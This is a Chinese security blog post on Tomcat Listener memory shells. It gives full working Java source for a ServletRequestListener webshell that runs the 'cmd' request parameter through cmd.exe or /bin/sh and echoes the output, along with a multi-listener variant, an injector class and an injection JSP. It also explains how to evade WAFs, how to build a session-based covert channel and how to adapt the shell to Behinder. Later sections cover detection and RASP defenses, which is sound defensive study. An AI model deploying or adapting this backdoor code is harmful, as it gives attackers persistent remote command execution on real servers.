---
title: Tomcat Listener 内存马
date: 2025-12-27
categories: 
- 漏洞分析
tags: 
- tomcat
- Listener
- 内存马
- Java安全
---

# Listener 内存马

Listener（监听器）型内存马利用 Tomcat 的事件监听机制，在特定事件（如请求到达、Session 创建）触发时执行恶意代码。相比 Filter 和 Servlet 型内存马，Listener 型具有更高的隐蔽性 —— 大多数安全产品不监控 Listener 的注册行为。

---

## 一、Tomcat Listener 机制

### 1.1 什么是 Listener

Listener 是 Servlet 规范中的观察者模式实现，用于监听 Web 应用中的生命周期事件。Tomcat 容器在特定事件发生时，会调用已注册的 Listener 回调方法。

```
事件源（Event Source）          事件（Event）          监听器（Listener）
─────────────────────    ───────────────────    ────────────────────
Context 启动              ServletContextEvent    contextInitialized()
请求到达                  ServletRequestEvent    requestInitialized()
请求结束                  ServletRequestEvent    requestDestroyed()
Session 创建              HttpSessionEvent       sessionCreated()
Session 销毁              HttpSessionEvent       sessionDestroyed()
属性变更                  ServletContextAttributeEvent  attributeAdded()
```

### 1.2 Listener 类型总览

| 监听器接口 | 触发时机 | 适用场景 |
|-----------|---------|----------|
| `ServletContextListener` | 应用启动 / 关闭 | 一次性初始化逻辑 |
| `ServletRequestListener` | 每个请求到达 / 完成 | **每条请求都可触发 ← 内存马首选** |
| `HttpSessionListener` | Session 创建 / 销毁 | 隐蔽性好（低频触发） |
| `ServletRequestAttributeListener` | 请求属性变更 | 特定场景 |
| `HttpSessionAttributeListener` | Session 属性变更 | 特定场景 |
| `ServletContextAttributeListener` | Context 属性变更 | 隐蔽性极高 |

### 1.3 Listener 的注册与调用流程

```java
// StandardContext 中维护的 Listener 列表
public class StandardContext extends ContainerBase implements Context {
    // 应用级监听器（通过 web.xml 或 @WebListener 注册）
    private List<Object> applicationEventListenersList = new CopyOnWriteArrayList<>();
    
    // 生命周期监听器（框架内部使用）
    private List<Object> lifecycleListeners = new CopyOnWriteArrayList<>();
    
    // 添加监听器
    public void addApplicationEventListener(Object listener) {
        applicationEventListenersList.add(listener);
    }
}
```

请求到达时的调用链：

```
CoyoteAdapter.service()
    → StandardEngineValve.invoke()
        → StandardHostValve.invoke()
            → StandardContextValve.invoke()
                → StandardWrapperValve.invoke()
                    → ApplicationFilterChain.doFilter()
```

**关键点**：`ServletRequestListener.requestInitialized()` 在 Filter 链之前调用，这意味着 Listener 的执行优先级高于 Filter。

---

## 二、动态注册原理

### 2.1 注册方式对比

| 注册方式 | 示例 | 动态性 |
|---------|------|--------|
| `web.xml` | `<listener-class>` | 静态 |
| 注解 | `@WebListener` | 静态 |
| **代码调用** | `context.addApplicationEventListener()` | **动态** ← 攻击面 |

`addApplicationEventListener()` 方法是 `public` 的，不需要反射即可调用，是天然的内存马注入入口。

### 2.2 动态注册步骤

```
1. 编写恶意 Listener 类（实现 ServletRequestListener）
2. 获取 StandardContext 对象（反射链）
3. 调用 context.addApplicationEventListener(maliciousListener)
4. 无需额外配置 —— 下一个请求到达时自动触发
```

相比 Filter 内存马，Listener 内存马的注入步骤更少：
- 不需要构造 `FilterDef` / `FilterMap`
- 不需要手动创建 `ApplicationFilterConfig`
- 不需要关心数组排序

---

## 三、完整代码实现

### 3.1 恶意 Listener 类（基础版）

```java
import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

/**
 * 基于 ServletRequestListener 的内存马
 * 每个 HTTP 请求都会触发 requestInitialized()
 */
public class ListenerMemShell implements ServletRequestListener {

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        ServletRequest servletRequest = sre.getServletRequest();
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        
        // 提取命令参数
        String cmd = request.getParameter("cmd");
        if (cmd != null && !cmd.isEmpty()) {
            try {
                // 执行命令
                Process process;
                if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                    process = Runtime.getRuntime().exec(
                        new String[]{"cmd.exe", "/c", cmd});
                } else {
                    process = Runtime.getRuntime().exec(
                        new String[]{"/bin/sh", "-c", cmd});
                }

                // 读取命令输出
                InputStream inputStream = process.getInputStream();
                Scanner scanner = new Scanner(
                    inputStream, 
                    System.getProperty("sun.jnu.encoding")
                ).useDelimiter("\\A");
                String result = scanner.hasNext() ? scanner.next() : "";

                // 回显 —— 通过反射获取 Response 对象
                // 注意：servletRequest 实际类型是 RequestFacade
                // 需先获取内部 Request，再从中取 response 字段
                Field reqField = servletRequest.getClass()
                    .getDeclaredField("request");
                reqField.setAccessible(true);
                Object innerRequest = reqField.get(servletRequest);
                
                Field responseField = innerRequest.getClass()
                    .getDeclaredField("response");
                responseField.setAccessible(true);
                HttpServletResponse response = (HttpServletResponse)
                    responseField.get(innerRequest);

                response.getWriter().write("<pre>" + result + "</pre>");
                scanner.close();
            } catch (Exception ignored) {
                // 静默处理，不影响正常业务
            }
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        // 无需操作
    }
}
```

### 3.2 恶意 Listener 类（增强版 —— 多重监听器）

```java
import javax.servlet.*;
import javax.servlet.http.*;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

/**
 * 同时实现多个监听器接口，增加触发路径
 */
public class MultiListenerMemShell 
        implements ServletRequestListener, 
                   HttpSessionListener, 
                   ServletContextListener {

    // ===== ServletRequestListener =====
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        executeCommand(sre.getServletRequest());
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {}

    // ===== HttpSessionListener =====
    @Override
    public void sessionCreated(HttpSessionEvent se) {
        // Session 创建时：从 Session 属性中获取命令
        HttpSession session = se.getSession();
        String sessionCmd = (String) session.getAttribute("__cmd__");
        if (sessionCmd != null && !sessionCmd.isEmpty()) {
            executeCommand(sessionCmd);
            session.removeAttribute("__cmd__");
        }
    }

    @Override
    public void sessionDestroyed(HttpSessionEvent se) {}

    // ===== ServletContextListener =====
    @Override
    public void contextInitialized(ServletContextEvent sce) {
        // 注入时机：如果能在此阶段注入，则后续所有请求都会被监听
        // 通常在动态注入场景下，此处不会执行（应用已启动完毕）
    }

    @Override
    public void contextDestroyed(ServletContextEvent sce) {}

    /**
     * 统一命令执行入口
     */
    private void executeCommand(ServletRequest request) {
        String cmd = request.getParameter("cmd");
        if (cmd == null || cmd.isEmpty()) return;

        try {
            Process process = Runtime.getRuntime().exec(cmd);
            InputStream inputStream = process.getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
            String result = scanner.hasNext() ? scanner.next() : "";

            // 反射回显
            // 注意：request 实际类型是 RequestFacade，需先获取内部 Request
            Field reqField = request.getClass()
                .getDeclaredField("request");
            reqField.setAccessible(true);
            Object innerRequest = reqField.get(request);
            
            Field responseField = innerRequest.getClass()
                .getDeclaredField("response");
            responseField.setAccessible(true);
            HttpServletResponse response = (HttpServletResponse)
                responseField.get(innerRequest);
            
            // 确保响应未提交
            if (!response.isCommitted()) {
                response.getWriter().write("<pre>" + result + "</pre>");
            }
            scanner.close();
        } catch (Exception ignored) {
        }
    }

    /**
     * Session 场景的备用执行方法
     */
    private void executeCommand(String cmd) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            InputStream inputStream = process.getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
            String result = scanner.hasNext() ? scanner.next() : "No output";
            System.out.println("[ListenerShell] " + result);
            scanner.close();
        } catch (Exception ignored) {
        }
    }
}
```

### 3.3 注入器代码

```java
import org.apache.catalina.core.StandardContext;
import java.lang.reflect.Field;

public class ListenerMemShellInjector {

    /**
     * 注入 Listener 内存马
     * 核心：调用 StandardContext.addApplicationEventListener()
     */
    public static void inject(StandardContext context) {
        // Step 1: 检查是否已注入（防重复）
        for (Object listener : context.getApplicationEventListeners()) {
            if (listener.getClass().getName()
                    .equals("ListenerMemShell")) {
                System.out.println("[!] Listener already injected.");
                return;
            }
        }

        // Step 2: 创建恶意 Listener 实例
        ListenerMemShell listener = new ListenerMemShell();

        // Step 3: 直接调用 public 方法注册（无需反射！）
        context.addApplicationEventListener(listener);

        System.out.println("[+] Listener memory shell injected.");
    }

    /**
     * 从 request 获取 StandardContext 并注入
     */
    public static void injectFromRequest(javax.servlet.ServletRequest request) 
            throws Exception {
        // 获取 StandardContext（与 Filter 篇相同方法）
        Field requestField = request.getClass().getDeclaredField("request");
        requestField.setAccessible(true);
        org.apache.catalina.connector.Request req = 
            (org.apache.catalina.connector.Request) requestField.get(request);
        StandardContext context = (StandardContext) req.getContext();
        
        inject(context);
    }
}
```

### 3.4 触发注入的 JSP

```jsp
<%@ page import="org.apache.catalina.core.*" %>
<%
    try {
        // 获取 StandardContext
        Field reqF = request.getClass().getDeclaredField("request");
        reqF.setAccessible(true);
        Request req = (Request) reqF.get(request);
        StandardContext context = (StandardContext) req.getContext();

        // 一行注册
        context.addApplicationEventListener(new ListenerMemShell());
        
        out.println("[+] Listener memory shell injected!");
        out.println("[+] Test: curl 'http://target/?cmd=whoami'");
    } catch (Exception e) {
        out.println("[-] Failed: " + e.getMessage());
    }
%>
```

---

## 四、代码详解

### 4.1 为什么 Listener 注入最简单？

```java
// Filter 内存马注入步骤（多步反射）
FilterDef filterDef = new FilterDef();           // Step 1
filterDef.setFilterName(name);                   // Step 2
filterDef.setFilterClass(className);             // Step 3
context.addFilterDef(filterDef);                 // Step 4
FilterMap filterMap = new FilterMap();           // Step 5
filterMap.addURLPattern("/*");                   // Step 6
context.addFilterMap(filterMap);                 // Step 7
// 还需要反射创建 ApplicationFilterConfig...      // Step 8

// Listener 内存马注入（一步到位）
context.addApplicationEventListener(maliciousListener);  // DONE ✓
```

`addApplicationEventListener()` 是 Context 接口的 **public 方法**，直接可用，无需任何反射操作来辅助注册。

### 4.2 回显的技术细节

Listener 的 `requestInitialized` 方法只接收 `ServletRequestEvent` 参数，无法直接获取 `HttpServletResponse`。需要通过**两步反射**：

```java
// Tomcat 内部结构
// ServletRequestEvent.getServletRequest() → RequestFacade
//   └── request 字段 → org.apache.catalina.connector.Request
//         └── response 字段 → org.apache.catalina.connector.Response
```

**关键点**：`RequestFacade` 只有 `request` 字段（指向内部 `Request`），**没有** `response` 字段。`getDeclaredField()` 只查找当前类声明的字段，不会向上搜索父类。因此必须：

```java
// Step 1: 从 RequestFacade 中取出内部 Request
Field reqField = servletRequest.getClass().getDeclaredField("request");
reqField.setAccessible(true);
Object innerRequest = reqField.get(servletRequest);

// Step 2: 从内部 Request 中取出 Response
Field responseField = innerRequest.getClass().getDeclaredField("response");
responseField.setAccessible(true);
HttpServletResponse response = (HttpServletResponse) responseField.get(innerRequest);
```

### 4.3 防重复注入

```java
// 检查当前已注册的 Listener
for (Object listener : context.getApplicationEventListeners()) {
    if (listener.getClass().getName().equals("ListenerMemShell")) {
        return; // 已注入
    }
}
```

### 4.4 三种内存马优先级关系

```
HTTP 请求到达
    ↓
① Listener.requestInitialized()    ← 最早执行
    ↓
② Filter.doFilter()                ← 中间拦截
    ↓
③ Servlet.service()                ← 最后处理
```

Listener 在所有组件中**最先被调用**，这意味着即使 Filter 链中抛出异常或返回错误，Listener 的逻辑也已执行完毕。

---

## 五、利用场景

### 5.1 反序列化 → Listener 注入（最隐蔽）

```java
// 反序列化 payload 中的代码片段
// 优势：不修改 FilterDef / FilterMap / Wrapper，躲过绝大多数监控
StandardContext context = (StandardContext) request.getContext();
context.addApplicationEventListener(new ListenerMemShell());
```

### 5.2 绕过 Filter 监控型 WAF

```
WAF 监控：
  ✅ filterDefs 变化
  ✅ filterMaps 变化  
  ❌ applicationEventListenersList 变化（盲区）

攻击者 → 注入 Listener 内存马 → WAF 完全无感知
```

### 5.3 Session 型内存马（低频隐蔽通道）

不通过 URL 参数，而是通过 Session 属性传递命令：

```java
// 访问一个普通页面（创建 Session）
GET /index.html
Cookie: JSESSIONID=ABC123

// 在 Session 中设置命令（通过其他漏洞，如反序列化）
session.setAttribute("__cmd__", "whoami");

// 再次访问，触发 session 事件（如 Session 过期重新创建）
// → sessionCreated() → 读取 __cmd__ → 执行 → 清除属性
```

这种方式不通过 URL 参数传递命令，流量特征极小。

### 5.4 冰蝎 / 哥斯拉适配

```java
// 冰蝎 Listener 内存马适配
public class BehinderListenerMemShell implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
        
        // 解析冰蝎加密数据
        String encryptedData = request.getHeader("X-BeHinder");
        if (encryptedData != null) {
            String decrypted = BehinderCrypto.decrypt(encryptedData);
            // ... 执行逻辑
        }
    }
}
```

---

## 六、检测方式

### 6.1 JMX 检查

```bash
# 查看所有应用事件监听器
jconsole → MBeans → Catalina → Context → /your-app
  → Operations → findApplicationListeners()
```

### 6.2 Arthas 在线排查

```bash
# 查看 StandardContext 中的监听器列表
vmtool --action getInstances \
  --className org.apache.catalina.core.StandardContext \
  --express 'instances[0].applicationEventListenersList' \
  --limit 10

# 搜索实现了 Listener 接口的可疑类
sc *.*Listener

# 查看所有 ServletRequestListener 实例
vmtool --action getInstances \
  --className javax.servlet.ServletRequestListener \
  --express 'instances' \
  --limit 20
```

### 6.3 内存分析

```bash
# Dump 内存
jmap -dump:live,format=b,file=listener.hprof <pid>

# MAT 中搜索
# 1. 列出所有实现 ServletRequestListener 的实例
# 2. 检查类名是否在应用依赖中
# 3. 对比部署包中 web.xml 的监听器配置
```

### 6.4 运行时代码扫描

```java
// 获取所有已注册监听器
for (Object listener : context.getApplicationEventListeners()) {
    String className = listener.getClass().getName();
    // 过滤标准库类
    if (className.startsWith("org.apache.") || 
        className.startsWith("org.springframework.")) {
        continue;
    }
    // 检查类来源（jar 包/动态生成）
    ProtectionDomain pd = listener.getClass().getProtectionDomain();
    CodeSource cs = pd.getCodeSource();
    System.out.println("[CHECK] " + className + " → " + cs.getLocation());
}
```

---

## 七、防御建议

| 层面 | 措施 | 说明 |
|------|------|------|
| **RASP** | Hook `addApplicationEventListener()` | 监控非启动阶段的调用 |
| **JVM Agent** | 监控 `applicationEventListenersList` 的 `add()` 操作 | 捕获动态注入行为 |
| **Security Manager** | 限制反射访问 `Request.response` 字段 | 阻断回显通道 |
| **巡检脚本** | 定期对比 Listener 基线 | 发现异常监听器 |

```java
// RASP Hook 示例：拦截 Listener 动态注册
@RuntimeType
public static void onAddEventListener(@This StandardContext context,
                                       @Argument(0) Object listener) {
    // 判断是否在启动阶段
    StackTraceElement[] stack = Thread.currentThread().getStackTrace();
    for (StackTraceElement frame : stack) {
        if (frame.getClassName().contains("ContextConfig")) {
            return; // 正常启动流程，放行
        }
    }
    // 非启动阶段的 addApplicationEventListener → 告警
    SecurityAlert.alert("Suspicious Listener registration", 
        listener.getClass().getName(), stack);
    throw new SecurityException("Runtime Listener injection blocked");
}
```

---

## 八、总结

Listener 内存马是三种 Tomcat 内存马中**隐蔽性最高**的一种：

| 特性 | Filter | Servlet | **Listener** |
|------|--------|---------|-------------|
| 注入难度 | ⭐⭐⭐ | ⭐⭐ | **⭐（最简单）** |
| 触发时机 | Filter 链 | Servlet 处理 | **请求到达瞬间** |
| 隐蔽性 | ⭐⭐⭐ | ⭐⭐⭐⭐ | **⭐⭐⭐⭐⭐（最高）** |
| 监控覆盖 | 常见 | 较少 | **极少** |

**核心理由**：
1. `context.addApplicationEventListener()` 是 **public 方法**，无需反射
2. Listener 在 Filter 之前执行，不受 Filter 链影响
3. 大多数安全产品**不监控 Listener 注册**
4. `applicationEventListenersList` 是 `CopyOnWriteArrayList`，可以随时安全地动态添加

**攻击者偏好排序**（综合隐蔽性与功能）：
1. **Listener** — 最隐蔽，最简单
2. **Filter** — 最灵活，覆盖面最广
3. **Servlet** — 备选通道，特定场景

> **延伸阅读**：[Tomcat Filter 内存马](/2025/12/27/tomcat-filter-memory-shell/) | [Tomcat Servlet 内存马](/2025/12/27/tomcat-servlet-memory-shell/) | [Tomcat基础](/2025/12/30/tomcat-basics/)
